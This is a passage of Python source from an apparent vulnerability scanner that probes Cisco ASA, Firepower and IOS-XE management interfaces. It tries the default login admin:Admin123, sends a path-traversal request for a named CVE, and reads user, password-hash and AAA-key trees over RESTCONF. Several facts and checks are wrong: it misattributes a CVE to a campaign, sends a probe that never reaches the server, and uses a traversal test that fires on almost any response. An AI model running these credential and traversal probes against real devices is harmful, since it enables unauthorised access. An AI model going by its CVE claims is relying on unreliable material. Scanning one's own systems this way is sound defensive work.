                return resp.status, resp.read().decode('utf-8', errors='replace')
        except Exception:
            return None, ''

    # /+CSCOE+/portal.html — clientless SSL VPN portal
    # Ch22: After authentication the ASA presents the WebVPN portal at this path.
    # Accessible without credentials indicates the portal pre-auth surface is
    # open; content may include group aliases, tunnel group names, or portal
    # customization artifacts that disclose internal naming.
    status, body = _get('/+CSCOE+/portal.html')
    if status == 200 and body and len(body) > 50:
        findings.append({
            'severity': 'HIGH',
            'title':    'CLIENTLESS_VPN_PORTAL',
            'detail':   (f'GET /+CSCOE+/portal.html returned HTTP 200; clientless SSL VPN portal '
                         f'page accessible — may disclose tunnel group names, group aliases, portal '
                         f'customization content, or pre-auth application listings; '
                         f'Ch22: portal is the entry point for WebVPN bookmark and smart tunnel '
                         f'access to internal application servers; '
                         f'sample: {body[:150].strip()!r}'),
            'host':     host,
            'port':     port,
        })

        # Check portal response for internal network address disclosure
        # Ch22: Bookmark entries reference internal servers by IP or FQDN.
        # Pre-auth or unauthenticated portal pages that include these addresses
        # disclose internal network topology to unauthenticated clients.
        internal_pattern = _re.compile(
            r'\b(192\.168\.\d{1,3}\.\d{1,3}|10\.\d{1,3}\.\d{1,3}\.\d{1,3}'
            r'|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b'
        )
        internal_matches = internal_pattern.findall(body)
        if internal_matches:
            unique_ips = list(dict.fromkeys(internal_matches))[:5]
            findings.append({
                'severity': 'HIGH',
                'title':    'INTERNAL_URLS_IN_PORTAL',
                'detail':   (f'Internal RFC-1918 addresses found in /+CSCOE+/portal.html response '
                             f'without authentication; addresses disclosed: {unique_ips}; '
                             f'Ch22: bookmark entries for internal web servers (HTTP/HTTPS) and '
                             f'CIFS file servers embed private network addresses — exposure '
                             f'discloses internal network topology to unauthenticated clients'),
                'host':     host,
                'port':     port,
            })

    # /+webvpn+/bookmark.html — WebVPN bookmark list endpoint
    # Ch22: The ASA stores and serves bookmark lists (url-list objects) that map
    # named entries to internal server URLs. Direct access without auth exposes
    # the full list of internal application targets the VPN is designed to reach.
    status, body = _get('/+webvpn+/bookmark.html')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'CLIENTLESS_VPN_BOOKMARKS',
            'detail':   (f'GET /+webvpn+/bookmark.html returned HTTP 200 without authentication; '
                         f'internal application bookmark list exposed — contains URLs of internal '
                         f'web servers, CIFS file shares, and application servers the clientless '
                         f'SSL VPN is configured to proxy; '
                         f'Ch22: bookmark lists (url-list objects) name every internal resource '
                         f'accessible via the WebVPN portal, including CIFS share paths and '
                         f'RDP/SSH plug-in targets; '
                         f'sample: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # /+CSCOE+/portal.html?id=N — IDOR probe across portal session IDs
    # Ch22: The portal.html id= parameter indexes session or user-context state.
    # Predictable integer IDs without authorization validation may allow one
    # authenticated user to read another user's bookmark list or session context.
    idor_hits = []
    for probe_id in (1, 2, 3):
        s, b = _get(f'/+CSCOE+/portal.html?id={probe_id}')
        if s == 200 and b and len(b) > 50:
            idor_hits.append(probe_id)
    if idor_hits:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'CLIENTLESS_VPN_IDOR_SURFACE',
            'detail':   (f'GET /+CSCOE+/portal.html?id= returned HTTP 200 for id(s) {idor_hits} '
                         f'without authentication; portal ID parameter accepts integer values and '
                         f'returns portal content — sequential IDs may enable access to other '
                         f'users\' bookmark lists or session state without authorization; '
                         f'Ch22: portal session context includes applied bookmark list, group '
                         f'policy attributes, and any DAP-injected URL lists'),
            'host':     host,
            'port':     port,
        })

    return findings


def probe_cisco_ftd_management_exposure(host: str, port: int = 8305, timeout: float = 10.0) -> list:
    """Probe Cisco Firepower Threat Defense (FTD) and FMC management surfaces.

    Cisco Firepower Management Center (FMC) exposes a REST API on port 8305 (or 443
    on dedicate management interfaces) that governs all FTD managed devices. The API
    follows a token-auth model: POST /api/fmc_platform/v1/auth/generatetoken with
    valid credentials returns X-auth-access-token / X-auth-refresh-token headers
    used for subsequent requests. On misconfigured deployments the token endpoint
    accepts default credentials (admin:Admin123) or anonymous access.

    FTD on-box management REST (Firepower Device Manager, FDM) is accessible on port
    443 of the management interface and exposes device deployment state, routing table
    (virtual routers), and interface config without enforced authentication on some
    FTD 6.x and 7.0.x builds.

    CVE-2022-20828 (CVSS 8.1): Cisco FTD CLI path traversal — crafted GET request to
    /cgi-bin/php.cgi?type=../ traverses the management web server root and reads
    arbitrary files from the underlying OS, including /etc/passwd and FTD config
    artefacts.

    CVE-2024-20353 (CVSS 8.6): Cisco ASA and FTD HTTP/2 CONTINUATION frame handling
    flaw — a remote unauthenticated attacker can cause a device reload by sending
    specially crafted HTTP/2 packets; the management surface (port 443) is the attack
    vector, so its presence on a publicly routable address is a HIGH-severity exposure
    regardless of successful exploitation.

    Book ch2 (Cisco Firewalls, Moraes): FWSM and dedicated firewall management planes
    must be strictly access-controlled; the management interface should never be
    reachable from the data plane or the public Internet.
    """
    findings: list = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _https_req(path: str, method: str = 'GET', data: bytes = None,
                   extra_headers: dict = None, tgt_port: int = port) -> tuple:
        url = f'https://{host}:{tgt_port}{path}'
        hdrs = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192).decode('utf-8', errors='replace'), dict(r.headers)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body, {}
        except Exception:
            return None, '', {}

    # ------------------------------------------------------------------
    # FMC REST: POST generatetoken with default credentials
    # Ch2: management-plane access with vendor defaults is the single most
    # common initial-access vector against dedicated firewall appliances.
    cred = base64.b64encode(b'admin:Admin123').decode()
    status, body, hdrs = _https_req(
        '/api/fmc_platform/v1/auth/generatetoken',
        method='POST',
        data=b'',
        extra_headers={'Authorization': f'Basic {cred}', 'Content-Length': '0'},
    )
    if status in (200, 204) and ('x-auth-access-token' in {k.lower() for k in hdrs}
                                  or 'token' in body.lower()):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'FMC_DEFAULT_CREDS',
            'detail':   (f'POST /api/fmc_platform/v1/auth/generatetoken with admin:Admin123 '
                         f'returned HTTP {status}; FMC accepted default credentials and issued '
                         f'an access token — full FMC API access is now available including '
                         f'device management, policy push, and config read/write; '
                         f'Ch2: management-plane access via vendor defaults enables immediate '
                         f'lateral movement to all FTD devices managed by this FMC; '
                         f'response headers: {list(hdrs.keys())[:8]}'),
            'host':     host,
            'port':     port,
        })

    # FMC REST: GET access policies — unauthenticated read
    status, body, _ = _https_req('/api/fmc_config/v1/domain/default/policy/accesspolicies')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'FMC_ACCESS_POLICIES_UNAUTH',
            'detail':   (f'GET /api/fmc_config/v1/domain/default/policy/accesspolicies '
                         f'returned HTTP 200 without authentication; FMC access control policy '
                         f'definitions exposed — reveals all firewall rulesets, zone mappings, '
                         f'IPS/URL-filter policy bindings, and logging config across managed '
                         f'FTD devices; sample: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # FMC REST: GET device records — inventory disclosure
    status, body, _ = _https_req('/api/fmc_config/v1/domain/default/devices/devicerecords')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'FMC_DEVICE_LIST_UNAUTH',
            'detail':   (f'GET /api/fmc_config/v1/domain/default/devices/devicerecords '
                         f'returned HTTP 200 without authentication; managed FTD device inventory '
                         f'exposed — includes device hostnames, management IPs, software versions, '
                         f'license state, and registration tokens; '
                         f'sample: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # FMC REST: GET server version — version fingerprint
    status, body, _ = _https_req('/api/fmc_platform/v1/info/serverversion')
    if status == 200 and body and len(body) > 5:
        findings.append({
            'severity': 'HIGH',
            'title':    'FMC_VERSION_EXPOSED',
            'detail':   (f'GET /api/fmc_platform/v1/info/serverversion returned HTTP 200; '
                         f'FMC software version details exposed without authentication — enables '
                         f'precise CVE targeting; '
                         f'response: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # ------------------------------------------------------------------
    # FDM (on-box REST, port 443): deployment status
    for fdm_port in sorted({port, 443}):
        status, body, _ = _https_req('/api/platform/v1/device/deployment', tgt_port=fdm_port)
        if status == 200 and body and len(body) > 10:
            findings.append({
                'severity': 'HIGH',
                'title':    'FTD_DEPLOYMENT_STATUS',
                'detail':   (f'GET /api/platform/v1/device/deployment (port {fdm_port}) '
                             f'returned HTTP 200 without authentication; FTD pending deployment '
                             f'state exposed — reveals pending policy changes, last deployment '
                             f'timestamp, and pending diff between candidate and running config; '
                             f'sample: {body[:200].strip()!r}'),
                'host':     host,
                'port':     fdm_port,
            })

        # FDM: routing table via virtual routers endpoint
        status, body, _ = _https_req(
            '/api/fdm/v6/devices/default/routing/virtualrouters', tgt_port=fdm_port)
        if status == 200 and body and len(body) > 10:
            findings.append({
                'severity': 'HIGH',
                'title':    'FTD_ROUTING_UNAUTH',
                'detail':   (f'GET /api/fdm/v6/devices/default/routing/virtualrouters '
                             f'(port {fdm_port}) returned HTTP 200 without authentication; '
                             f'FTD routing table virtual-router definitions exposed — reveals '
                             f'connected networks, static routes, and OSPF/BGP config; '
                             f'Ch5: routing table read discloses internal topology segments '
                             f'behind the firewall; '
                             f'sample: {body[:200].strip()!r}'),
                'host':     host,
                'port':     fdm_port,
            })

    # ------------------------------------------------------------------
    # HTTPS fingerprint: "Cisco Secure Firewall" or "Firepower" in HTML
    status, body, hdrs = _https_req('/', tgt_port=443)
    if status is not None and body:
        body_lower = body.lower()
        if ('firepower' in body_lower or 'cisco secure firewall' in body_lower
                or 'ftd' in body_lower or 'fmc' in body_lower):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'FTD_PORTAL_FINGERPRINT',
                'detail':   (f'GET / on port 443 returned content matching Firepower/FTD '
                             f'portal fingerprint ("Firepower", "Cisco Secure Firewall", "FTD" '
                             f'or "FMC" found in body); management portal is reachable and '
                             f'identifiable; '
                             f'sample: {body[:150].strip()!r}'),
                'host':     host,
                'port':     443,
            })

    # ------------------------------------------------------------------
    # CVE-2022-20828: FTD CGI path traversal
    # GET /cgi-bin/php.cgi?type=../ — traverses management web root
    status, body, _ = _https_req('/cgi-bin/php.cgi?type=../', tgt_port=443)
    if status == 200 and body and len(body) > 5:
        body_lower = body.lower()
        if ('root:' in body or 'etc/passwd' in body_lower
                or 'cisco' in body_lower or len(body) > 50):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'FTD_CVE_2022_20828',
                'detail':   (f'GET /cgi-bin/php.cgi?type=../ returned HTTP 200 with non-empty '
                             f'body — possible CVE-2022-20828 path traversal (CVSS 8.1); '
                             f'Cisco FTD CLI management web handler fails to sanitize the type= '
                             f'parameter, allowing traversal outside the cgi-bin root; '
                             f'successful exploitation reads arbitrary OS files including '
                             f'/etc/passwd and FTD configuration artefacts; '
                             f'sample: {body[:200].strip()!r}'),
                'host':     host,
                'port':     443,
            })

    # ------------------------------------------------------------------
    # CVE-2024-20353: HTTP/2 CONTINUATION surface (ASA/FTD DoS)
    # The vulnerability lives in the HTTP/2 parser on port 443; if the
    # management surface is Internet-reachable the DoS surface is open.
    # We do a TCP-connect + TLS-hello probe rather than sending a crafted
    # HTTP/2 CONTINUATION flood (which would constitute active exploitation).
    try:
        raw = socket.create_connection((host, 443), timeout=timeout)
        raw_ssl = ctx.wrap_socket(raw, server_hostname=host)
        # Send HTTP/2 PRI preface to confirm HTTP/2 is negotiated
        raw_ssl.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        banner = raw_ssl.recv(256)
        raw_ssl.close()
        if banner and len(banner) > 0:
            findings.append({
                'severity': 'HIGH',
                'title':    'FTD_HTTP2_CONTINUATION_SURFACE',
                'detail':   (f'Port 443 accepted TLS + HTTP/2 preface connection; '
                             f'CVE-2024-20353 (CVSS 8.6) attack surface is present — '
                             f'Cisco ASA/FTD HTTP/2 CONTINUATION frame handling flaw allows '
                             f'unauthenticated remote attacker to cause device reload via '
                             f'specially crafted HTTP/2 packets; management surface Internet-'
                             f'reachable; banner: {banner[:80]!r}'),
                'host':     host,
                'port':     443,
            })
    except Exception:
        pass

    return findings


def probe_cisco_ios_zbf_inspection(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe Cisco IOS Zone-Based Firewall policy bypass and IOS-XE management RE surface.

    IOS-XE ships a built-in HTTPS management WebUI (enabled by 'ip http secure-server')
    that presents a web dashboard on port 443. The WebUI is the attack vector for
    CVE-2023-20198 and CVE-2023-20273, two critical 0-days exploited in the wild in
    October 2023 ('ArcaneDoor' campaign).

    CVE-2023-20198 (CVSS 10.0 — auth bypass): A remote unauthenticated attacker can
    create a privileged local user account on affected IOS-XE by sending a crafted HTTP
    request to the web UI. The endpoint /dataservice/featuretemplates responds without
    authentication on vulnerable builds.

    CVE-2023-20273 (CVSS 7.2 — command injection): Chained with CVE-2023-20198, allows
    injecting arbitrary IOS CLI commands via the web management interface once an
    account has been created. The surface is the same WebUI port (443/80).

    IOS-XE RESTCONF (RFC 8040, port 443 by default) exposes the device's YANG data
    model tree over HTTPS. On misconfigured routers (missing 'restconf' AAA list or
    no 'aaa new-model'), GET /restconf/data/ietf-interfaces:interfaces returns the
    full interface tree unauthenticated. The /restconf/data/Cisco-IOS-XE-native:native
    subtree contains the running configuration including usernames and passwords.

    NETCONF (RFC 6241, port 830) is separately enabled by 'netconf-yang'. An open
    port 830 is HIGH severity: NETCONF carries the full configuration management
    capability of the device.

    The Zone-Based Policy Firewall (ZFW/ZBF) described in ch10 (Cisco Firewalls, Moraes)
    places interfaces into security zones; by default no traffic flows between zones
    unless a service-policy is explicitly configured. WebUI and RESTCONF bypass this
    model entirely — they terminate on the router's management plane (self zone) and
    are accessible regardless of ZBF inter-zone policy.

    Book ch9/ch10 (Cisco Firewalls, Moraes): CBAC and ZFW apply only to transit traffic
    (data plane); the router's own management services (HTTP, RESTCONF, NETCONF, SNMP)
    are in the 'self zone' and require separate ACL/AAA control — a design gap frequently
    left unconfigured.
    """
    findings: list = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str, tgt_port: int = port,
             extra_headers: dict = None) -> tuple:
        url = f'https://{host}:{tgt_port}{path}'
        hdrs = {'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/yang-data+json, application/json, text/html, */*'}
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192).decode('utf-8', errors='replace'), dict(r.headers)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body, {}
        except Exception:
            return None, '', {}

    # ------------------------------------------------------------------
    # IOS-XE WebUI fingerprint on port 443
    # Ch10: IOS WebUI ('ip http secure-server') terminates in the self zone;
    # ZBF interzone policy does not govern self-zone traffic.
    status, body, hdrs = _get('/', tgt_port=port)
    if status is not None and body:
        body_lower = body.lower()
        if ('cisco ios software' in body_lower or 'ios-xe' in body_lower
                or 'cisco systems' in body_lower
                or 'webui' in body_lower or 'ios xe' in body_lower):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'IOS_XE_WEBUI_DETECTED',
                'detail':   (f'GET / on port {port} returned content matching IOS-XE WebUI '
                             f'fingerprint ("Cisco IOS Software", "IOS-XE", "Cisco Systems", '
                             f'"WebUI" found in body); management web interface reachable; '
                             f'Ch10: ZBF self-zone traffic bypasses inter-zone policy — WebUI '
                             f'exposure is independent of ZBF configuration; '
                             f'sample: {body[:150].strip()!r}'),
                'host':     host,
                'port':     port,
            })

    # ------------------------------------------------------------------
    # CVE-2023-20198: IOS-XE WebUI auth bypass
    # /dataservice/featuretemplates responds without auth on vulnerable builds
    status, body, _ = _get('/dataservice/featuretemplates')
    if status == 200 and body and len(body) > 5:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_CVE_2023_20198',
            'detail':   (f'GET /dataservice/featuretemplates returned HTTP 200 without '
                         f'authentication; CVE-2023-20198 (CVSS 10.0) indicator — IOS-XE '
                         f'WebUI auth bypass allows unauthenticated remote attacker to create '
                         f'a privileged level-15 local account; exploited in the wild in '
                         f'Oct 2023 (ArcaneDoor campaign) to achieve full device compromise; '
                         f'affected: IOS-XE with http/https server enabled, prior to patched '
                         f'builds (17.3.8a, 17.6.6a, 17.9.4a, 17.11.1); '
                         f'sample: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # CVE-2023-20273: command injection surface indicator
    # Same WebUI port as CVE-2023-20198; separate injection vector in the
    # Cisco-IOS-XE-wireless-wlan-oper YANG path handler. Check for a 200
    # on the wireless mgmt endpoint as a surface indicator only (not exploitation).
    status, body, _ = _get('/webui/#/wireless/ap-neighbors')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_CVE_2023_20273_SURFACE',
            'detail':   (f'GET /webui/#/wireless/ap-neighbors returned HTTP 200 without '
                         f'authentication on port {port}; CVE-2023-20273 (CVSS 7.2) surface '
                         f'present — IOS-XE WebUI command injection flaw; when chained with '
                         f'CVE-2023-20198 (account creation), allows injecting arbitrary IOS '
                         f'CLI commands with privilege level 15; '
                         f'sample: {body[:150].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # ------------------------------------------------------------------
    # RESTCONF: ietf-interfaces unauth read
    # Ch10: RESTCONF/NETCONF bypass ZBF (self zone); 'aaa authorization exec'
    # must be configured to enforce creds — absent on many ISR/CSR deployments.
    status, body, _ = _get('/restconf/data/ietf-interfaces:interfaces')
    if status == 200 and body and len(body) > 10:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_RESTCONF_UNAUTH',
            'detail':   (f'GET /restconf/data/ietf-interfaces:interfaces returned HTTP 200 '
                         f'without authentication; RESTCONF management API unauthenticated — '
                         f'full interface configuration tree exposed including IP addresses, '
                         f'VRF bindings, and enabled services; '
                         f'Ch10: RESTCONF operates in the IOS-XE self zone, outside ZBF '
                         f'inter-zone policy; missing AAA authorization for RESTCONF is the '
                         f'root cause; '
                         f'sample: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # RESTCONF: native:native/username — running-config user table
    status, body, _ = _get('/restconf/data/Cisco-IOS-XE-native:native/username')
    if status == 200 and body and len(body) > 5:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_RESTCONF_USERS_UNAUTH',
            'detail':   (f'GET /restconf/data/Cisco-IOS-XE-native:native/username returned '
                         f'HTTP 200 without authentication; IOS-XE local user database exposed '
                         f'via RESTCONF — contains usernames and (hashed or type-7) passwords '
                         f'from the running configuration; '
                         f'type-7 passwords are trivially reversible; privilege levels and '
                         f'SSH keys may also be present; '
                         f'sample: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # ------------------------------------------------------------------
    # NETCONF port 830: TCP connect probe
    # Ch10: NETCONF carries the same configuration management capability as
    # CLI; open port 830 on a public interface is an independent HIGH finding.
    try:
        sock = socket.create_connection((host, 830), timeout=timeout)
        banner_830 = sock.recv(512)
        sock.close()
        findings.append({
            'severity': 'HIGH',
            'title':    'IOS_XE_NETCONF_PORT_OPEN',
            'detail':   (f'TCP port 830 (NETCONF) accepted connection; '
                         f'NETCONF (RFC 6241) carries full IOS-XE configuration management '
                         f'capability — equivalent to CLI access; enabled by '
                         f'"netconf-yang" global command; '
                         f'Ch10: NETCONF operates in the self zone and is not governed by '
                         f'ZBF inter-zone policy; missing AAA authorization makes this '
                         f'a direct configuration-management surface; '
                         f'banner: {banner_830[:80]!r}'),
            'host':     host,
            'port':     830,
        })
    except Exception:
        pass

    # ------------------------------------------------------------------
    # YANG library version: information disclosure
    status, body, _ = _get('/restconf/yang-library-version')
    if status == 200 and body and len(body) > 3:
        findings.append({
            'severity': 'HIGH',
            'title':    'IOS_XE_YANG_LIBRARY',
            'detail':   (f'GET /restconf/yang-library-version returned HTTP 200 without '
                         f'authentication; YANG module library version exposed — reveals '
                         f'exact IOS-XE YANG model revision, enabling precise CVE targeting '
                         f'against specific YANG path handlers; '
                         f'response: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # ------------------------------------------------------------------
    # IOS version in Server header
    # Some IOS-XE builds include version info in the HTTP Server: header.
    server_hdr = hdrs.get('Server', '') if 'hdrs' in dir() else ''
    # Re-fetch root to get headers if we didn't already
    if not server_hdr:
        _, _, root_hdrs = _get('/', tgt_port=port)
        server_hdr = root_hdrs.get('Server', '')
    if server_hdr:
        ios_ver_pattern = re.compile(
            r'(IOS[-\s]?XE|IOS[-\s]Software|Cisco[-\s]HTTPS|cisco[-\s]ios)',
            re.IGNORECASE
        )
        if ios_ver_pattern.search(server_hdr):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'IOS_VERSION_IN_HEADERS',
                'detail':   (f'HTTP Server header discloses IOS/IOS-XE version information: '
                             f'{server_hdr!r}; version exposure enables targeted CVE selection '
                             f'without active probing; '
                             f'Ch4: IOS debug/show tools and management headers are primary '
                             f'fingerprint sources; suppressed by "ip http server-header" '
                             f'in hardened configurations'),
                'host':     host,
                'port':     port,
            })

    return findings


def probe_cisco_yang_model_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect exposed Cisco YANG model and RESTCONF data model reverse-engineering surface.

    YANG (RFC 7950) defines the structure of network configuration and operational
    state data. RESTCONF (RFC 8040) provides an HTTP-based protocol for accessing
    YANG-modeled data over HTTPS port 443 using a REST-style interface.

    IOS-XE implements ietf-yang-library (RFC 8525) at
    /restconf/data/ietf-yang-library:modules-state — unauthenticated access
    exposes the full YANG module inventory (module name, revision, namespace URI,
    feature/deviation sets) enabling complete programmable surface mapping.

    Cisco-IOS-XE-native is the proprietary YANG module covering the full IOS-XE
    native configuration tree. Unauthenticated reads of the native subtrees expose
    hostname, local user database, PKI certificates, and AAA configuration directly
    from the running datastore — trivial lateral movement prerequisites.

    OpenConfig (vendor-neutral) and IETF YANG modules are also probed:
    openconfig-interfaces discloses full L2/L3 addressing; ietf-routing exposes
    the RIB and protocol instances.

    Sources: YANG and NETCONF (ISBN 9780135180471), Cisco DevNet RESTCONF guide,
    NX-OS Programmability Guide 9.3(x) ch-netconf-agent.md.
    """
    import ssl as _ssl
    import urllib.request as _urllib_req
    import urllib.error as _urllib_err
    import re as _re

    findings = []

    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/yang-data+json, application/json',
        }
        try:
            req = _urllib_req.Request(url, headers=headers)
            with _urllib_req.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                return resp.status, body
        except _urllib_err.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # --- ietf-yang-library: modules-state (RFC 8525) ---
    # Exposes the complete YANG module inventory loaded on the device: module name,
    # revision date, namespace URI, conformance-type, and feature/deviation sets.
    # This is a complete reverse-engineering manifest of the device programmable
    # surface, enabling targeted RESTCONF/NETCONF exploitation without any scanning.
    status, body = _get('/restconf/data/ietf-yang-library:modules-state')
    if status == 200 and body:
        module_count = len(_re.findall(r'"name"\s*:', body))
        findings.append({
            'severity': 'CRITICAL',
            'title':    'YANG_MODULES_STATE_UNAUTH',
            'detail':   (
                f'GET /restconf/data/ietf-yang-library:modules-state returned HTTP 200 '
                f'without authentication; ietf-yang-library modules-state (RFC 8525) '
                f'discloses the complete YANG module inventory — {module_count} module '
                f'name entries detected; each entry reveals module name, revision, '
                f'namespace URI, conformance-type, and feature/deviation sets; '
                f'this is a complete programmable surface manifest enabling targeted '
                f'RESTCONF/NETCONF exploitation'
            ),
            'host': host,
            'port': port,
        })

    # --- ietf-yang-library: yang-library container (RFC 8525 schema-mounts) ---
    status, body = _get('/restconf/data/ietf-yang-library:yang-library')
    if status == 200 and body:
        findings.append({
            'severity': 'HIGH',
            'title':    'YANG_LIBRARY_UNAUTH',
            'detail':   (
                f'GET /restconf/data/ietf-yang-library:yang-library returned HTTP 200 '
                f'without authentication; RFC 8525 yang-library container exposes '
                f'module-sets, schema-mounts, datastores, and content-id — '
                f'structured enumeration of all supported YANG schema trees and '
                f'datastore bindings; sample: {body[:200].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- RESTCONF YANG library version endpoint ---
    status, body = _get('/restconf/yang-library-version')
    if status == 200 and body:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'YANG_LIBRARY_VERSION',
            'detail':   (
                f'GET /restconf/yang-library-version returned HTTP 200; '
                f'discloses the YANG library RFC revision implemented on the device; '
                f'confirms RESTCONF is enabled and accessible; '
                f'response: {body[:150].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- Cisco-IOS-XE-native: hostname ---
    # Cisco-IOS-XE-native covers the full IOS-XE native configuration tree.
    # Hostname read requires no privilege — confirms RESTCONF is open without ACL.
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/hostname')
    if status == 200 and body:
        hostname_match = _re.search(r'"hostname"\s*:\s*"([^"]+)"', body)
        hostname_val = hostname_match.group(1) if hostname_match else 'present'
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_HOSTNAME_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/hostname returned '
                f'HTTP 200 without authentication; Cisco-IOS-XE-native YANG module '
                f'exposes hostname directly from running datastore; '
                f'hostname: {hostname_val!r}; '
                f'RESTCONF enabled without authentication or IP access-class restriction'
            ),
            'host': host,
            'port': port,
        })

    # --- Cisco-IOS-XE-native: username (local user database) ---
    # Exposes local AAA user entries including privilege levels and password hashes
    # (type-5 MD5-crypt, type-8 PBKDF2, type-9 scrypt) from the running datastore.
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/username')
    if status == 200 and body:
        user_matches = _re.findall(r'"name"\s*:\s*"([^"]+)"', body)
        user_list = user_matches[:10] if user_matches else []
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_USERNAMES_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/username returned '
                f'HTTP 200 without authentication; Cisco-IOS-XE-native YANG module '
                f'exposes local user database from running datastore; '
                f'usernames detected: {user_list}; '
                f'password hashes (type-5/8/9) and privilege levels present in response; '
                f'enables offline cracking of enable secrets and local credentials'
            ),
            'host': host,
            'port': port,
        })

    # --- Cisco-IOS-XE-native: crypto/pki/certificate ---
    # PKI trustpoint certificates disclose CA trust chains and device identity certs.
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/crypto/pki/certificate')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_CERTS_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/crypto/pki/certificate '
                f'returned HTTP 200 without authentication; Cisco-IOS-XE-native YANG '
                f'module exposes PKI trustpoint certificate entries from running datastore; '
                f'may include CA certificates, device identity certs, and certificate '
                f'chain data enabling trust relationship mapping; '
                f'sample: {body[:200].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- Cisco-IOS-XE-native: aaa (AAA configuration subtree) ---
    # AAA configuration discloses authentication method-lists, TACACS+/RADIUS server
    # addresses and shared keys, authorization policies, and accounting targets.
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/aaa')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_AAA_CONFIG_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/aaa returned '
                f'HTTP 200 without authentication; Cisco-IOS-XE-native YANG module '
                f'exposes full AAA configuration from running datastore; '
                f'includes authentication method-lists, authorization policies, '
                f'TACACS+/RADIUS server addresses and shared keys, and accounting '
                f'targets — critical for mapping authentication bypass paths and '
                f'server-side credential targets; '
                f'sample: {body[:200].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- OpenConfig: openconfig-interfaces ---
    # OpenConfig YANG models (vendor-neutral, openconfig.net) are supported by
    # IOS-XE alongside Cisco-native modules. The interfaces model exposes all
    # L2/L3 configurations including IP addresses, VLANs, and operational state.
    status, body = _get('/restconf/data/openconfig-interfaces:interfaces')
    if status == 200 and body:
        iface_count = len(_re.findall(r'"name"\s*:', body))
        findings.append({
            'severity': 'HIGH',
            'title':    'OPENCONFIG_INTERFACES_UNAUTH',
            'detail':   (
                f'GET /restconf/data/openconfig-interfaces:interfaces returned '
                f'HTTP 200 without authentication; OpenConfig interfaces YANG model '
                f'exposes all interface configurations and operational state; '
                f'{iface_count} interface name entries detected; '
                f'discloses IP addressing, VLAN assignments, MTU, admin/oper state, '
                f'and L3 subinterface config — sufficient to reconstruct full '
                f'network topology from a single unauthenticated read'
            ),
            'host': host,
            'port': port,
        })

    # --- IETF: ietf-routing (RFC 8022) ---
    # Exposes routing RIB instances, routing protocol configurations, router-id,
    # and static/dynamic route tables. Sufficient for full topology reconstruction.
